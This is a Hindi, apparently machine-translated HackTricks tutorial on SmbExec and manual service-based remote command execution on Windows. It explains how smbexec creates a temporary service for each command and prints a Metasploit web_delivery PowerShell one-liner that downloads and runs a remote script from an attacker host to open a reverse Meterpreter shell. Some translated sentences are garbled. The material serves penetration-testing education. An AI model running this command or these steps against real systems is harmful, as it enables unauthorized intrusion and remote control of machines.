# SmbExec/ScExec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!

- खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)

- प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **अपने हैकिंग ट्रिक्स को [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके साझा करें।**

</details>

## यह कैसे काम करता है

**Smbexec Psexec की तरह काम करता है।** इस उदाहरण में, हम शिकारी के भीतर एक खतरनाक निष्पक्षीय या powershell.exe की ओर इशारा करने की बजाय cmd.exe या powershell.exe की ओर इशारा करेंगे और उनमें से एक बैकडोर डाउनलोड और निष्पादित करेगा।

## **SMBExec**

हम देखेंगे कि smbexec क्या होता है जब हम उसे हमलावर और लक्ष्य की दृष्टि से देखते हैं:

![](../../.gitbook/assets/smbexec\_prompt.png)

तो हम जानते हैं कि यह एक सेवा "BTOBTO" बनाता है। लेकिन जब हम `sc query` करते हैं तो यह सेवा लक्ष्य मशीन पर मौजूद नहीं होती है। सिस्टम लॉग्स इसके बारे में एक संकेत देते हैं कि क्या हुआ है:

![](../../.gitbook/assets/smbexec\_service.png)

सेवा फ़ाइल नाम में एक कमांड स्ट्रिंग होती है जो निष्पादित करने के लिए होती है (%COMSPEC% cmd.exe के निर्देशिका में पहुंच करता है)। यह निष्पादित करने के लिए एक बैट फ़ाइल में निष्पादित करता है, stdout और stderr को एक Temp फ़ाइल में रीडायरेक्ट करता है, फिर बैट फ़ाइल को निष्पादित करता है और उसे हटा देता है। काली पर, पायथन स्क्रिप्ट फिर SMB के माध्यम से आउटपुट फ़ाइल खींचता है और हमारे "प्सेडो-शैल" में सामग्री प्रदर्शित करता है। हमारे "शैल" में हमारे द्वारा टाइप किए गए प्रत्येक कमांड के लिए एक नई सेवा बनाई जाती है और प्रक्रिया दोहराई जाती है। यही कारण है कि इसे एक बाइनरी ड्रॉप करने की आवश्यकता नहीं होती है, यह बस प्रत्येक चाहिए गए कमांड को एक नई सेवा के रूप में निष्पादित करता है। निश्चित रूप से अधिक छिपकली, लेकिन जैसा कि हमने देखा, प्रत्येक निष्पादित कमांड के लिए एक ईवेंट लॉग बनाया जाता है। यह एक गैर-संवादात्मक "शैल" प्राप्त करने का एक बहुत ही चतुर तरीका है!

## मैनुअल SMBExec

**या सेवाओं के माध्यम से कमांड निष्पादित करना**

Smbexec द्वारा दिखाया गया, एक बाइनरी की आवश्यकता न होने के बजाय सीधे सेवा binPaths से कमांड निष्पादित करना संभव है। यदि आपको केवल एक यादृच्छिक कमांड को लक्ष्य Windows मशीन पर निष्पादित करने की आवश्यकता हो तो यह आपके पास एक उपयोगी ट्रिक हो सकती है। एक त्वरित उदाहरण के रूप में, एक बाइनरी के बिना एक दूरस्थ सेवा का उपयोग करके एक Meterpreter शैल प्राप्त करें।

हम Metasploit का `web_delivery` मॉड्यूल उपयोग करेंगे और एक पावरशेल लक्ष्य का चयन करेंगे जिसमें एक प्रतिवर्ती Meterpreter पेलोड होता है। लिस्टेनर सेट अप हो जाता है और यह हमें लक्ष्य मशीन पर निष्पादित करने के लिए कमांड बताता है:
```
powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');
```
हमारे Windows हमला बॉक्स से, हम एक दूरस्थ सेवा ("metpsh") बनाते हैं और अपने पेलोड के साथ cmd.exe को निष्पादित करने के लिए binPath सेट करते हैं:

![](../../.gitbook/assets/sc\_psh\_create.png)

और फिर इसे शुरू करते हैं:

![](../../.gitbook/assets/sc\_psh\_start.png)

यह त्रुटि दिखाता है क्योंकि हमारी सेवा प्रतिक्रिया नहीं करती है, लेकिन अगर हम अपने Metasploit सुनने वाले को देखें तो हम देखेंगे कि कॉलबैक हुआ था और पेलोड निष्पादित हुआ।

सभी जानकारी यहां से निकाली गई थी: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आप **PEASS के नवीनतम संस्करण का उपयोग करना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!

- खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह

- प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **अपने हैकिंग ट्रिक्स साझा करें, [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके**।

</details>
